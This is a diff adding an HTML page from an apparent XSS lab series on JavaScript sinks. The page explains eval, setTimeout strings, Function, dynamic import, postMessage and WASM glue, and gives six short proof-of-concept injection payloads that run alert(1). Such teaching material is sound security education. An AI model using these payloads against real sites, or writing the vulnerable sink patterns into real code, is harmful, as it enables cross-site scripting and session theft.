@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JS Sinks</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/09-js-sinks</span></div>
+<main class="wrap">
+    <h1>JavaScript Sinks</h1>
+
+    <h2>What sinks are</h2>
+    <p>JavaScript functions that accept strings and *execute* them: eval, setTimeout(string), innerHTML, Function(), import().</p>
+
+    <h2>Why they’re dangerous</h2>
+    <p>User data reaches the sink without compilation-phase separation → same-origin code execution.</p>
+
+    <h2>Where you’ll meet them</h2>
+    <p>SPA routers, live chat widgets, dynamic component loaders, WebAssembly glue, postMessage handlers, “eval-like” template helpers.</p>
+
+    <h2>Impact</h2>
+    <p>DOM XSS, CSP bypass, post-exploitation module loader, supply-chain back-door (see 2024 Webpack remote-import abuse).</p>
+
+    <h2>Mini case-study</h2>
+    <p>2022 Slack setTimeout(string) XSS via channel name → stolen session → $3 500 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- setTimeout template -->
+    <pre><code>// String version becomes eval
+setTimeout("render('"+user+"')",0);  // user = "',alert(1),'"</code></pre>
+
+    <!-- Function ctor -->
+    <pre><code>// Last arg is body
+new Function('a',user)();  // user = "alert(1)"</code></pre>
+
+    <!-- setInterval break -->
+    <pre><code>// Token breaks out of string
+setInterval('check("'+token+'")',1000);  // token = '");alert(1);//'</code></pre>
+
+    <!-- Dynamic import -->
+    <pre><code>// URL becomes module
+import(user).then(m=>m.run());  // user = 'data:text/javascript,alert(1)'</code></pre>
+
+    <!-- postMessage eval -->
+    <pre><code>// Wildcard origin
+window.onmessage=e=>eval(e.data);  // postMessage('alert(1)', '*')</code></pre>
+
+    <!-- WASM emscripten -->
+    <pre><code>// Exported function calls eval
+const wasm=await WebAssembly.instantiateStreaming(fetch('evil.wasm'));
+wasm.instance.exports._emscripten_run_script('alert(1)');</code></pre>
+
+    <h3>Further reading</h3>
+    <ul>
+        <li><a href="https://github.com/wisec/domxsswiki/wiki/Sinks" style="color:var(--cyan)">DOM XSS Wiki — Sinks</a></li>
+    </ul>
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
